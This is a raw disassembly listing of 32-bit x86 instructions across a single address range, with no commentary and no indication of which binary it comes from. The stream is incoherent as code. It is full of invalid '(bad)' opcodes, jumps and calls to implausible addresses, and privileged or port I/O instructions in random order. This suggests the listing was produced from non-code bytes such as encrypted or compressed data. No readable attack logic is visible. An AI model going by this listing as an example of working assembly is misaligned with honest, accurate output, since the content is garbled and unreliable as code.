  40219b:	mov    fs,WORD PTR [ebx]
  40219d:	daa    
  40219e:	sbb    DWORD PTR [edi+0x55c11caf],ecx
  4021a4:	dec    ebx
  4021a5:	pop    ds
  4021a6:	jb     0x40212c
  4021a8:	loopne 0x402221
  4021aa:	xor    cl,BYTE PTR [edi+0x4291d874]
  4021b0:	push   esi
  4021b1:	leave  
  4021b2:	sub    BYTE PTR ss:[ebp+0x26],ch
  4021b6:	push   cs
  4021b7:	mov    al,ds:0x7ba4cf64
  4021bc:	js     0x40213f
  4021be:	fld    QWORD PTR [edi-0x7b]
  4021c1:	pusha  
  4021c2:	das    
  4021c3:	jae    0x402196
  4021c5:	inc    eax
  4021c6:	loop   0x402243
  4021c8:	into   
  4021c9:	pop    ebx
  4021ca:	test   BYTE PTR [edi],bh
  4021cc:	pop    esp
  4021cd:	lds    eax,FWORD PTR [edx]
  4021cf:	lea    ecx,[esi+edi*4-0x707053db]
  4021d6:	inc    ebp
  4021d7:	sbb    esi,DWORD PTR [eax]
  4021d9:	pop    ebp
  4021da:	push   0x1b0fd2a0
  4021df:	jmp    0x792aa647
  4021e4:	(bad)  
  4021e5:	(bad)  
  4021e6:	mov    ebx,0x9fa8127f
  4021eb:	jo     0x4021e8
  4021ed:	jne    0x4021c5
  4021ef:	adc    eax,0xebd149be
  4021f4:	jle    0x402213
  4021f6:	outs   dx,BYTE PTR ds:[esi]
  4021f7:	mov    ds:0xe0929bd4,eax
  4021fc:	pop    ebx
  4021fd:	shr    DWORD PTR [esi+0x7b],0x0
  402201:	shl    ah,cl
  402203:	ins    DWORD PTR es:[edi],dx
  402204:	ret    0x36ee
  402207:	mov    ch,0x57
  402209:	aaa    
  40220a:	mov    al,ds:0xb15368e3
  40220f:	imul   ebx,DWORD PTR [esi],0x59abd4e
  402215:	cmp    ah,al
  402217:	lods   al,BYTE PTR ds:[esi]
  402218:	in     eax,0x9e
  40221a:	shr    BYTE PTR [esi-0x14],1
  40221d:	ret    
  40221e:	push   edx
  40221f:	retf   
  402220:	add    eax,0x10d7594e
  402225:	push   ecx
  402226:	retf   
  402227:	sahf   
  402228:	or     BYTE PTR [ebx],al
  40222a:	ss xchg ebp,eax
  40222c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40222d:	loop   0x402206
  40222f:	in     eax,dx
  402230:	out    dx,eax
  402231:	fldenv [edx]
  402233:	push   cs
  402234:	rcr    BYTE PTR [ecx],cl
  402236:	push   0xffffffb0
  402238:	mov    bl,0xd6
  40223a:	lock dec eax
  40223c:	push   cs
  40223d:	inc    ecx
  40223e:	fsub   QWORD PTR [ecx]
  402240:	call   DWORD PTR [edi]
  402242:	stos   DWORD PTR es:[edi],eax
  402243:	xchg   edi,eax
  402244:	pop    edx
  402245:	jns    0x40222d
  402247:	pop    ecx
  402248:	mov    edi,0xf368f1d1
  40224d:	hlt    
  40224e:	inc    edx
  40224f:	shl    DWORD PTR [ebp+0x31],1
  402252:	std    
  402253:	fucomi st,st(3)
  402255:	test   eax,0x4130781d
  40225a:	adc    DWORD PTR [ebp+0x41],ecx
  40225d:	push   0x66485cd3
  402262:	mov    eax,0x6d41a58d
  402267:	dec    edx
  402268:	lds    esp,FWORD PTR ds:0xd2e38683
  40226e:	xchg   edi,eax
  40226f:	mov    ebx,0xf2e58b8f
  402274:	mov    esp,DWORD PTR [edi+ebp*4]
  402277:	xchg   ebx,eax
  402278:	xchg   edx,edx
  40227a:	repnz sbb al,0xdc
  40227d:	in     eax,0x4f
  40227f:	and    eax,0x466eede2
  402284:	xor    al,BYTE PTR [ecx+0x7c]
  402287:	js     0x4022dd
  402289:	adc    DWORD PTR ds:0xdf451c13,esi
  40228f:	rcl    DWORD PTR [eax-0x48],0xf6
  402293:	inc    eax
  402294:	std    
  402295:	outs   dx,BYTE PTR ds:[esi]
  402296:	sbb    BYTE PTR [ecx-0x5c],dh
  402299:	push   ecx
  40229a:	xchg   edi,eax
  40229b:	retf   0x40df
  40229e:	fwait
  40229f:	add    al,0xe5
  4022a1:	das    
  4022a2:	aam    0x4e
  4022a4:	sbb    BYTE PTR [esi+0x19],dh
  4022a7:	or     ebx,ecx
  4022a9:	jno    0x4022eb
  4022ab:	inc    eax
  4022ac:	(bad)  
  4022ad:	sub    ecx,esp
  4022af:	add    edi,DWORD PTR [ebx]
  4022b1:	retf   0x172d
  4022b4:	push   edi
  4022b5:	xchg   ebx,eax
  4022b6:	adc    eax,0x5d33fb1a
  4022bb:	push   ds
  4022bc:	xchg   edx,eax
  4022bd:	mov    cl,ah
  4022bf:	sbb    DWORD PTR [bp+0x8],esi
  4022c3:	jbe    0x4022f9
  4022c5:	pop    eax
  4022c6:	ins    DWORD PTR es:[edi],dx
  4022c7:	inc    edx
  4022c8:	imul   esi,DWORD PTR [edx+0x7f],0x19a927a3
  4022cf:	inc    edx
  4022d0:	inc    DWORD PTR [esi+0x5f40c295]
  4022d6:	and    eax,0x13ccf27c
  4022db:	outs   dx,BYTE PTR ds:[esi]
  4022dc:	fs loopne 0x40230f
  4022df:	dec    edx
  4022e0:	mov    ecx,0x77079e00
  4022e5:	jnp    0x40235f
  4022e7:	sti    
  4022e8:	outs   dx,BYTE PTR ds:[esi]
  4022e9:	sub    eax,0xedf74bdb
  4022ee:	test   eax,0x95707f03
  4022f3:	mov    DWORD PTR [ebx+0x42ec35f0],edi
  4022f9:	cld    
  4022fa:	mov    ebx,0x49d670d5
  4022ff:	inc    DWORD PTR [eax+0x33]
  402302:	cmp    edx,DWORD PTR [ebx-0x5d]
  402305:	mov    cl,0x58
  402307:	inc    edx
  402308:	adc    DWORD PTR ds:0x49d97981,ecx
  40230e:	les    edi,FWORD PTR [eax]
  402310:	inc    ebp
  402311:	dec    ebp
  402312:	push   esi
  402313:	pusha  
  402314:	scas   eax,DWORD PTR es:[edi]
  402315:	jae    0x402374
  402317:	int3   
  402318:	mov    bl,0x7a
  40231a:	clc    
  40231b:	std    
  40231c:	mov    ecx,0x7094a352
  402321:	rcl    BYTE PTR [ecx-0x69],1
  402324:	pop    ds
  402325:	push   ss
  402326:	cmp    BYTE PTR [ecx+0x46],dh
  402329:	sbb    al,0x9
  40232b:	xlat   BYTE PTR ds:[ebx]
  40232c:	adc    BYTE PTR [ebx+0x43c07132],dl
  402332:	scas   al,BYTE PTR es:[edi]
  402333:	xchg   BYTE PTR [edx-0x30],ch
  402336:	in     eax,0xaa
  402338:	or     DWORD PTR cs:[edi+0x62],eax
  40233c:	loopne 0x4023b4
  40233e:	mov    WORD PTR [edi],di
  402341:	test   eax,0x71989310
  402346:	dec    eax
  402347:	aad    0xe3
  402349:	xchg   ecx,eax
  40234a:	sbb    al,0xf8
  40234c:	xchg   ecx,eax
  40234d:	or     eax,0xec3e905d
  402352:	mov    esi,0x45679fb8
  402357:	sahf   
  402358:	popf   
  402359:	inc    edi
  40235a:	mov    eax,ds:0x7c4316d4
  40235f:	add    al,0x46
  402361:	mov    DWORD PTR [eax+0x7f345825],esp
  402367:	jnp    0x40236b
  402369:	imul   eax,DWORD PTR [ecx+0x32],0x6b7b0c98
  402370:	hlt    
  402371:	(bad)  
  402372:	and    al,0x2d
  402374:	dec    eax
  402375:	(bad)  
  402376:	sbb    WORD PTR ds:0x77a8a68d,dx
  40237d:	retf   0x2b0c
  402380:	sbb    DWORD PTR [edi-0x6f8bf576],eax
  402386:	jecxz  0x402389
  402388:	or     eax,0x18f1e33a
  40238d:	mov    eax,0xbcf5ae8b
  402392:	push   eax
  402393:	int3   
  402394:	rcl    BYTE PTR [edi-0x7e],1
  402397:	pop    esi
  402398:	sar    WORD PTR [eax],0x10
  40239c:	repz clc 
  40239e:	and    esi,edx
  4023a0:	test   dh,bh
  4023a2:	or     eax,0x87991af8
  4023a7:	xchg   BYTE PTR [ebx+edi*4-0x528a763e],ch
  4023ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023b0:	jae    0x40237a
  4023b2:	cmp    DWORD PTR [eax],esp
  4023b4:	aaa    
  4023b5:	shl    al,cl
  4023b7:	stos   DWORD PTR es:[edi],eax
  4023b8:	ficomp DWORD PTR [ebx+0x4261cb20]
  4023be:	out    dx,al
  4023bf:	or     eax,0xc946ab17
  4023c4:	cmp    eax,DWORD PTR [esi+0x1f64fcc3]
  4023ca:	and    bh,BYTE PTR [ebx+0x1a]
  4023cd:	in     eax,0xd2
  4023cf:	dec    ebp
  4023d0:	fmul   QWORD PTR [ecx-0x33]
  4023d3:	sbb    DWORD PTR [ebx-0x302ccec5],edi
  4023d9:	int    0x10
  4023db:	dec    edx
  4023dc:	imul   eax,DWORD PTR [edx+0x16d4faf2],0xfce2ac5d
  4023e6:	sub    ecx,DWORD PTR [edi]
  4023e8:	add    DWORD PTR [ebp-0x5],eax
  4023eb:	scas   eax,DWORD PTR es:[edi]
  4023ec:	cdq    
  4023ed:	aam    0x63
  4023ef:	and    ecx,DWORD PTR [ecx-0x1c6feb81]
  4023f5:	push   0xc07ad3da
  4023fa:	fcomp  DWORD PTR [ecx+0x2d]
  4023fd:	lahf   
  4023fe:	stos   DWORD PTR es:[edi],eax
  4023ff:	aaa    
  402400:	cmp    eax,0xa4a08b4
  402405:	and    al,bl
  402407:	pop    ds
  402408:	fincstp 
  40240a:	xchg   DWORD PTR [ebx],ecx
  40240c:	push   ecx
  40240d:	loop   0x40248e
  40240f:	xchg   edi,eax
  402410:	adc    cl,ch
  402412:	mov    BYTE PTR [edx+edi*4-0x52eff19b],dh
  402419:	arpl   WORD PTR ds:0x25dca3,ax
  40241f:	or     eax,0xf4dfa2a9
  402424:	das    
  402425:	jbe    0x402410
  402427:	push   edx
  402428:	push   eax
  402429:	mov    ebp,0xc40b9935
  40242e:	mov    BYTE PTR [edx],cl
  402430:	or     BYTE PTR [ecx+0x1a],dl
  402433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402434:	dec    ebp
  402435:	imul   esi
  402437:	pushf  
  402438:	xchg   DWORD PTR [esi+0x4b],ebx
  40243b:	in     eax,0x9d
  40243d:	pop    eax
  40243e:	test   DWORD PTR [esi-0x27],ecx
  402441:	mov    ebp,0x499974b9
  402446:	cmp    dh,0xb5
  402449:	fmul   QWORD PTR [eax+0x45ede9f]
  40244f:	ror    BYTE PTR [esi-0x4af6ab8e],0xa7
  402456:	jae    0x40240c
  402458:	cmp    DWORD PTR [ecx-0x15b5ebfa],eax
  40245e:	in     eax,0xb4
  402460:	and    ecx,eax
  402462:	xchg   edi,eax
  402463:	aam    0x20
  402465:	mov    al,0x86
  402467:	and    al,ch
  402469:	push   ebx
  40246a:	sbb    eax,0x62f3395
  40246f:	bound  edi,QWORD PTR [ecx-0x38bef20f]
  402475:	aaa    
  402476:	xchg   BYTE PTR [ebx+0x1e],bh
  402479:	pushf  
  40247a:	mov    eax,0xfbafeceb
  40247f:	adc    DWORD PTR [ecx+0x3cd5191e],edi
  402485:	mov    DWORD PTR [edi+0x74097741],esp
  40248b:	jno    0x4024c4
  40248d:	nop
  40248e:	adc    al,0x4b
  402490:	xchg   ecx,eax
  402491:	into   
  402492:	ret    
  402493:	sub    ah,BYTE PTR ds:0xaa36c023
  402499:	fcmovnu st,st(4)
  40249b:	push   ss
  40249c:	int    0x50
  40249e:	outs   dx,BYTE PTR ds:[esi]
  40249f:	fsubr  QWORD PTR [esi-0x55]
  4024a2:	test   al,0xe5
  4024a4:	or     DWORD PTR [edx+0x2a834d22],ecx
  4024aa:	cdq    
  4024ab:	loope  0x402509
  4024ad:	mov    ebx,0xa63e0298
  4024b2:	or     dh,dh
  4024b4:	mov    ch,0x9f
  4024b6:	out    0x85,al
  4024b8:	je     0x4024f1
  4024ba:	jmp    ecx
  4024bc:	imul   ebp,DWORD PTR [esi-0x409b88a8],0x58
  4024c3:	rcr    BYTE PTR [edx+edx*8-0x7c],cl
  4024c7:	popf   
  4024c8:	dec    edx
  4024c9:	sahf   
  4024ca:	nop
  4024cb:	inc    edx
  4024cc:	sbb    al,ch
  4024ce:	shl    DWORD PTR [esi-0x60],0x76
  4024d2:	xor    eax,0x44e47e8
  4024d7:	xor    eax,0x19aafb
  4024dc:	xchg   DWORD PTR [ebp-0x57566ff],eax
  4024e2:	fbstp  TBYTE PTR [ecx]
  4024e4:	shrd   DWORD PTR [eax],eax,0x8c
  4024e8:	inc    esi
  4024e9:	ins    BYTE PTR es:[edi],dx
  4024ea:	mov    ebp,DWORD PTR [esi+0x50ca730a]
  4024f0:	(bad)  
  4024f1:	aam    0xe1
  4024f3:	jp     0x4024e2
  4024f5:	icebp  
  4024f6:	outs   dx,DWORD PTR ds:[esi]
  4024f7:	sub    al,0x53
  4024f9:	pop    esi
  4024fa:	jp     0x4024d6
  4024fc:	inc    esp
  4024fd:	sbb    DWORD PTR [ecx-0x57e94880],esp
  402503:	mov    ebp,0x21e08c16
  402508:	test   al,0x67
  40250a:	dec    BYTE PTR [esi-0x278a2f48]
  402510:	cmp    DWORD PTR [esi],esi
  402512:	ret    
  402513:	retf   0x642e
  402516:	sahf   
  402517:	adc    eax,DWORD PTR [edi+0x1]
  40251a:	out    0xa3,eax
  40251c:	inc    ecx
  40251d:	das    
  40251e:	aaa    
  40251f:	lods   eax,DWORD PTR ds:[esi]
  402520:	out    dx,al
  402521:	xchg   edx,eax
  402522:	xor    DWORD PTR [eax-0x33],esi
  402525:	(bad)  
  402526:	cli    
  402527:	loopne 0x40255c
  402529:	aam    0xa4
  40252b:	repnz in al,0x9c
  40252e:	dec    ebx
  40252f:	xchg   ebx,eax
  402530:	xchg   ebx,eax
  402531:	jo     0x402513
  402533:	scas   eax,DWORD PTR es:[edi]
  402534:	cli    
  402535:	add    ebx,eax
  402537:	popa   
  402538:	push   ebp
  402539:	pop    es
  40253a:	sub    BYTE PTR [ebx],dh
  40253c:	mov    ss,WORD PTR [esp+eax*1-0x59533723]
  402543:	sbb    dl,dl
  402545:	out    dx,eax
  402546:	js     0x4024f1
  402548:	ret    
  402549:	and    edi,DWORD PTR [esi-0x2475d213]
  40254f:	outs   dx,BYTE PTR ds:[esi]
  402550:	fbstp  TBYTE PTR [edi]
  402552:	and    al,0xb9
  402554:	or     BYTE PTR ds:0x16e8578f,bl
  40255a:	clc    
  40255b:	aas    
  40255c:	xchg   ecx,eax
  40255d:	call   0x867b833c
  402562:	sub    eax,0x809abab9
  402567:	xchg   esp,eax
  402568:	xchg   ecx,eax
  402569:	(bad)  
  40256a:	xor    al,0xa8
  40256c:	sbb    BYTE PTR [ecx+0x7],al
  40256f:	jmp    0xb525:0x5679f371
  402576:	pop    ds
  402577:	dec    esi
  402578:	out    0x86,al
  40257a:	jb     0x4025af
  40257c:	retf   0xbddf
  40257f:	jbe    0x402510
  402581:	sbb    al,0x96
  402583:	adc    eax,0x2d4b0b6d
  402588:	sub    ebp,DWORD PTR [eiz*4+0xb2f9f4e]
  40258f:	inc    esp
  402590:	sub    edx,DWORD PTR [ebx]
  402592:	enter  0x170a,0x4b
  402596:	aam    0x3d
  402598:	and    al,0x1a
  40259a:	nop
  40259b:	push   edx
  40259c:	ret    
  40259d:	xor    DWORD PTR [ebp+0x3e],edi
  4025a0:	lock out dx,al
  4025a2:	pop    esp
  4025a3:	popa   
  4025a4:	lds    edx,FWORD PTR [ebx-0x79]
  4025a7:	(bad)  
  4025a9:	ret    
  4025aa:	jne    0x4025f3
  4025ac:	(bad)  [ecx+0x36]
  4025af:	xchg   ebx,eax
  4025b0:	adc    eax,0xdd5afa53
  4025b5:	xor    al,0x6f
  4025b7:	ins    DWORD PTR es:[edi],dx
  4025b8:	add    eax,0x2305de14
  4025bd:	daa    
  4025be:	jbe    0x402570
  4025c0:	or     al,0xc9
  4025c2:	jp     0x4025e2
  4025c4:	lods   eax,DWORD PTR ds:[esi]
  4025c5:	xchg   DWORD PTR [edx],ebp
  4025c7:	fmul   QWORD PTR [esi+0x5e342547]
  4025cd:	xlat   BYTE PTR ds:[ebx]
  4025ce:	inc    edx
  4025cf:	inc    eax
  4025d0:	retf   0xec45
  4025d3:	mov    dl,cl
  4025d5:	and    DWORD PTR [esi],ebx
  4025d7:	ret    
  4025d8:	push   cs
  4025d9:	out    0x78,eax
  4025db:	hlt    
  4025dc:	fwait
  4025dd:	test   al,0x7f
  4025df:	int3   
  4025e0:	ins    DWORD PTR es:[edi],dx
  4025e1:	into   
  4025e2:	bound  ecx,QWORD PTR [edi]
  4025e4:	push   edi
  4025e5:	aaa    
  4025e6:	and    DWORD PTR ds:[edi],0xffffffc1
  4025ea:	pop    ebx
  4025eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025ec:	or     edx,esp
  4025ee:	stos   BYTE PTR es:[edi],al
  4025ef:	cli    
  4025f0:	shl    ebp,1
  4025f2:	inc    edx
  4025f4:	aam    0xb4
  4025f6:	cmc    
  4025f7:	jae    0x402582
  4025f9:	aam    0x1e
  4025fb:	fst    QWORD PTR [edi]
  4025fd:	sahf   
  4025fe:	cmp    al,0xdf
  402600:	aas    
  402601:	test   DWORD PTR [edx],ebp
  402603:	and    bh,BYTE PTR [ebp+0x74]
  402606:	sahf   
  402607:	sub    al,0xf1
  402609:	jecxz  0x4025ec
  40260b:	pushf  
  40260c:	imul   esi,DWORD PTR [edx+0x72],0xc98676b3
  402613:	(bad)  
  402614:	mov    ds:0x2fda181d,al
  402619:	or     DWORD PTR [ebp-0x14],edi
  40261c:	hlt    
  40261d:	lds    edi,FWORD PTR [esi-0x2b]
  402620:	cmp    DWORD PTR [ebx],esp
  402622:	sahf   
  402623:	mov    dl,0x8d
  402625:	dec    eax
  402626:	loope  0x4025c4
  402628:	mov    eax,DWORD PTR [edi]
  40262a:	or     al,0x94
  40262c:	test   al,0x5d
  40262e:	fsubr  QWORD PTR [ebx+ebx*8-0x6]
  402632:	pop    eax
  402633:	mov    edx,DWORD PTR [eax]
  402635:	and    DWORD PTR [ebx-0x38],ebp
  402638:	xchg   esi,eax
  402639:	cmp    cl,dh
  40263b:	scas   eax,DWORD PTR es:[edi]
  40263c:	lock fucom st(2)
  40263f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402640:	mov    bh,0x4c
  402642:	mov    cl,0x55
  402644:	fcomp  QWORD PTR [ecx-0x65c13f9c]
  40264a:	cmp    al,0x69
  40264c:	inc    eax
  40264d:	mov    ah,0xea
  40264f:	lea    esi,[eax-0x45]
  402652:	xchg   esi,eax
  402653:	aas    
  402654:	jns    0x4025e1
  402656:	ins    DWORD PTR es:[edi],dx
  402657:	cmp    edx,0xfb128b65
  40265d:	and    al,BYTE PTR [ecx+0x2072eeed]
  402663:	mov    WORD PTR [edi-0x42],ss
  402666:	xor    edi,0xf5bc5220
  40266c:	or     BYTE PTR [ecx+0x7c2fdb41],0xb
  402673:	jl     0x402610
  402675:	les    ebx,FWORD PTR [ecx-0x79a1c2d3]
  40267b:	adc    al,0x2e
  40267d:	jne    0x402612
  40267f:	sbb    eax,0x9f998b1e
  402684:	(bad)  
  402685:	sub    eax,0x518c20ab
  40268a:	mov    ebx,DWORD PTR [edx-0x684b2d0]
  402690:	adc    BYTE PTR gs:[ecx*2-0x6ba0136f],0x28
  402699:	popf   
  40269a:	cmp    BYTE PTR [eax-0x18],dh
  40269d:	imul   DWORD PTR [ebx-0x6c]
  4026a0:	scas   al,BYTE PTR es:[edi]
  4026a1:	stc    
  4026a2:	cli    
  4026a3:	ds fadd st,st(3)
  4026a6:	xor    edx,DWORD PTR [ecx-0x5]
  4026a9:	pop    edi
  4026aa:	dec    ebp
  4026ab:	and    ecx,DWORD PTR [edi-0x47d245f3]
  4026b1:	mov    ebx,0xb3a9f047
  4026b6:	into   
  4026b7:	lea    esp,[ebx+ebx*4+0x2f5d93a5]
  4026be:	and    DWORD PTR ss:[ecx],0xf0367c32
  4026c5:	xor    edi,DWORD PTR [ebx+0x76fcc9c5]
  4026cb:	jbe    0x40274b
  4026cd:	ins    DWORD PTR es:[edi],dx
  4026ce:	mov    es,ebx
  4026d0:	out    0x9a,eax
  4026d2:	or     eax,0xe3b98f50
  4026d7:	and    DWORD PTR [ecx+0x39],ebp
  4026da:	or     bh,BYTE PTR [esi]
  4026dc:	pop    ecx
  4026dd:	cmp    cl,al
  4026df:	pushf  
  4026e0:	test   eax,0x6bc5221e
  4026e5:	out    dx,eax
  4026e6:	aad    0xd1
  4026e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026e9:	ja     0x40275d
  4026eb:	shl    BYTE PTR ds:0x98ac24c5,cl
  4026f1:	xchg   DWORD PTR [ebp+edx*1-0x3857921],ecx
  4026f8:	lock adc BYTE PTR [edi+0x69],dl
  4026fc:	nop
  4026fd:	in     eax,0x46
  4026ff:	dec    edi
  402700:	push   cs
  402701:	adc    edi,DWORD PTR [edx]
  402703:	jo     0x402753
  402705:	mov    esp,0x143de9e1
  40270a:	test   DWORD PTR [ecx],esi
  40270c:	pop    eax
  40270d:	push   0x5c346916
  402712:	jge    0x4026e6
  402714:	push   ebp
  402715:	std    
  402716:	adc    edx,eax
  402718:	cmp    eax,0xe3348c84
  40271d:	push   0x2944bd56
  402722:	xor    esp,edi
  402724:	and    ch,al
  402726:	into   
  402727:	(bad)
  40272a:	ins    DWORD PTR es:[edi],dx
  40272b:	mov    ecx,0x23195af7
  402730:	or     al,0xb2
  402732:	jbe    0x4026c1
  402734:	and    esi,ebp
  402736:	dec    eax
  402737:	jmp    FWORD PTR [ecx-0x23a2f2d8]
  40273d:	test   DWORD PTR [esi-0x18059982],esp
  402743:	shr    BYTE PTR [ebx+ebp*2+0x4ab55bfa],1
  40274a:	jns    0x4027c5
  40274c:	(bad)  
  40274d:	xchg   esi,eax
  40274e:	daa    
  40274f:	(bad)  
  402750:	mov    edi,0x56916093
  402755:	popa   
  402756:	adc    eax,0xc03e4587
  40275b:	out    dx,al
  40275c:	or     eax,0xe242dc46
  402761:	shr    BYTE PTR gs:[ebx-0x30],cl
  402765:	sub    eax,0xb5e66a03
  40276a:	sub    eax,0x27fc038f
  40276f:	stos   BYTE PTR es:[edi],al
  402770:	cmp    DWORD PTR [ebp-0x63],0x99c00c51
  402777:	(bad)  
  402778:	ins    DWORD PTR es:[edi],dx
  402779:	dec    ecx
  40277a:	cwde   
  40277b:	dec    esi
  40277c:	pop    ecx
  40277d:	jg     0x4027ad
  40277f:	xor    DWORD PTR [ecx+0xa],ecx
  402782:	ja     0x402781
  402784:	fcomp  DWORD PTR [ecx-0x78f2cd1d]
  40278a:	inc    esp
  40278b:	pmaxub mm4,mm6
  40278e:	fcom   QWORD PTR [ebp-0x3d8008e8]
  402794:	push   ebx
  402795:	in     eax,dx
  402796:	add    eax,0x294a0fb2
  40279b:	dec    eax
  40279c:	mov    cl,BYTE PTR [esi-0x48]
  40279f:	lods   eax,DWORD PTR fs:[esi]
  4027a1:	(bad)  
  4027a2:	aad    0x76
  4027a4:	push   0xcfef1d48
  4027a9:	clc    
  4027aa:	sahf   
  4027ab:	sbb    al,0x4b
  4027ad:	fst    st(6)
  4027af:	adc    ecx,DWORD PTR [edi-0x5c]
  4027b2:	jl     0x40278a
  4027b4:	and    ebp,DWORD PTR [bx+si-0x6e]
  4027b8:	mov    gs,WORD PTR [ebx+0x48b4dc73]
  4027be:	jb     0x40282e
  4027c0:	xchg   edi,eax
  4027c1:	cld    
  4027c2:	mov    eax,0xb18f0fa3
  4027c7:	idiv   dl
  4027c9:	mov    db4,ebx
  4027cc:	leave  
  4027cd:	push   0x5e69343d
  4027d2:	sub    al,0x44
  4027d4:	mov    edx,0x48be5884
  4027d9:	jo     0x40284b
  4027db:	adc    al,0xfe
  4027dd:	cmp    al,0x1e
  4027df:	daa    
  4027e0:	xor    eax,DWORD PTR [esi-0x23]
  4027e3:	sub    eax,0x95f5079
  4027e8:	cwde   
  4027e9:	(bad)  
  4027eb:	inc    edi
  4027ec:	cmc    
  4027ed:	retf   0x4c67
  4027f0:	lods   eax,DWORD PTR ds:[esi]
  4027f1:	jl     0x40283e
  4027f3:	push   esi
  4027f4:	mov    ebp,0xfb19a2c
  4027f9:	in     al,dx
  4027fa:	xchg   ebp,eax
  4027fb:	arpl   WORD PTR [edx+esi*8],bp
  4027fe:	scas   al,BYTE PTR es:[edi]
  4027ff:	or     al,0x7f
  402801:	lods   eax,DWORD PTR ds:[esi]
  402802:	add    DWORD PTR [esi+0x74],esp
  402805:	pop    ebx
  402806:	dec    esp
  402807:	sbb    DWORD PTR [edx-0x1c5afc1c],0xcc036b4e
  402811:	mov    ds:0x508194f8,eax
  402816:	inc    edi
  402817:	js     0x402834
  402819:	scas   al,BYTE PTR es:[edi]
  40281a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40281b:	mov    ds:0xb952135e,eax
  402820:	and    bl,cl
  402822:	xchg   esi,eax
  402823:	lods   eax,DWORD PTR ds:[esi]
  402824:	inc    ebx
  402825:	or     esi,ebp
  402827:	inc    ebp
  402828:	push   ss
  402829:	imul   ebx,esi,0xffffffe3
  40282c:	inc    ebx
  40282d:	pop    esi
  40282e:	pop    eax
  40282f:	call   DWORD PTR [ebx-0x4d5ecac3]
  402835:	lahf   
  402836:	jae    0x4027b8
  402838:	cdq    
  402839:	mov    ecx,0x56eac93f
  40283e:	pop    es
  40283f:	cs je  0x402805
  402842:	mov    fs,WORD PTR [ebp+0x6070cc01]
  402848:	inc    eax
  402849:	dec    ebp
  40284a:	mov    ch,0xcd
  40284c:	(bad)  
  40284d:	in     al,dx
  40284e:	and    ebp,DWORD PTR [ebx]
  402850:	and    dl,BYTE PTR [ebx-0x4c8b6f81]
  402856:	ins    BYTE PTR es:[edi],dx
  402857:	add    esp,DWORD PTR [edx+edx*8]
  40285a:	lds    ebp,FWORD PTR [ebp+0x6e]
  40285d:	mov    esp,0x94524d54
  402862:	mov    ebx,ebp
  402864:	add    ebp,DWORD PTR [eax-0x589c1895]
  40286a:	xchg   edx,eax
  40286b:	lds    ecx,FWORD PTR [esi-0x1e750a41]
  402871:	jae    0x402897
  402873:	iret   
  402874:	push   ebx
  402875:	arpl   bx,cx
  402877:	adc    eax,0x1e9a118b
  40287c:	xchg   esp,eax
  40287d:	ins    BYTE PTR es:[edi],dx
  40287e:	pop    ds
  40287f:	push   esp
  402880:	mov    ch,0xb8
  402882:	bound  edx,QWORD PTR [ecx-0x2b]
  402885:	bound  esi,QWORD PTR [eax+0x63ba9225]
  40288b:	out    dx,al
  40288c:	test   DWORD PTR [edx],ebx
  40288e:	iret   
  40288f:	jmp    0x2ec7:0x17b90248
  402896:	mov    eax,ds:0x9b436291
  40289b:	nop
  40289c:	sbb    dl,BYTE PTR [ebp+eax*4+0x68]
  4028a0:	mov    al,ds:0x9505c406
  4028a5:	fs nop
  4028a7:	fild   DWORD PTR [ecx-0x33]
  4028aa:	loopne 0x4028e9
  4028ac:	inc    esp
  4028ad:	cmp    edi,DWORD PTR [esi-0x47]
  4028b0:	push   ecx
  4028b1:	mov    eax,ds:0xbc911088
  4028b6:	push   edi
  4028b7:	cli    
  4028b8:	lods   al,BYTE PTR ds:[esi]
  4028b9:	(bad)  
  4028ba:	lds    edx,FWORD PTR [ecx-0x73]
  4028bd:	fwait
  4028be:	iret   
  4028bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028c0:	scas   eax,DWORD PTR es:[edi]
  4028c1:	and    al,0xac
  4028c3:	test   BYTE PTR [esi+0x19d00f22],dh
  4028c9:	js     0x402855
  4028cb:	cmp    dh,BYTE PTR [esi]
  4028cd:	loopne 0x402875
  4028cf:	retf   0x3cf7
  4028d2:	stos   BYTE PTR es:[edi],al
  4028d3:	push   ebx
  4028d4:	add    BYTE PTR ds:0xbbbf8ce9,cl
  4028da:	hlt    
  4028db:	fs jno 0x402897
  4028de:	xor    eax,0x741da6cc
  4028e3:	sub    DWORD PTR ds:0xa738ccbc,esp
  4028e9:	dec    esi
  4028ea:	lock bound eax,QWORD PTR [esi-0x2b]
  4028ee:	dec    eax
  4028ef:	loope  0x4028c2
  4028f1:	mov    esp,0xefa4be64
  4028f6:	repnz inc esi
  4028f8:	out    dx,al
  4028f9:	in     eax,0x9a
  4028fb:	fucomip st,st(1)
  4028fd:	test   al,0xb6
  4028ff:	gs xor eax,0x91ae1099
  402905:	or     DWORD PTR [eax],ebp
  402907:	or     dh,dl
  402909:	jne    0x4028e3
  40290b:	imul   edx,DWORD PTR [esi+0x0],0x2f6231cd
  402912:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402913:	inc    ebx
  402914:	dec    edi
  402915:	stos   BYTE PTR es:[edi],al
  402916:	cmp    eax,0x44fd9fe4
  40291b:	cmp    eax,0x95b19cfd
  402920:	ins    BYTE PTR es:[edi],dx
  402921:	ds pop eax
  402923:	inc    ebp
  402924:	inc    edi
  402925:	lea    esi,[ebx+ebx*8+0x1a479033]
  40292c:	(bad)  
  40292d:	arpl   WORD PTR [ecx],bx
  40292f:	xor    al,0x22
  402931:	and    DWORD PTR [edi],esi
  402933:	inc    ebp
  402934:	mov    al,ds:0xdda38b59
  402939:	mov    ss,WORD PTR [ecx]
  40293b:	fcomp  DWORD PTR [edi+0x1ec7e711]
  402941:	push   ebp
  402942:	inc    ecx
  402943:	jp     0x4029ac
  402945:	add    DWORD PTR ds:0x1584f0be,0x18d106ec
  40294f:	xchg   DWORD PTR [ebp+ebp*2+0x56],ebp
  402953:	test   eax,0x43c3782b
  402958:	lods   al,BYTE PTR ds:[esi]
  402959:	jmp    0x87262476
  40295e:	outs   dx,DWORD PTR ds:[esi]
  40295f:	inc    ebx
  402960:	jmp    0x40293a
  402962:	ja     0x4029d1
  402964:	cli    
  402965:	pop    esp
  402966:	jbe    0x402957
  402968:	cmp    al,0x17
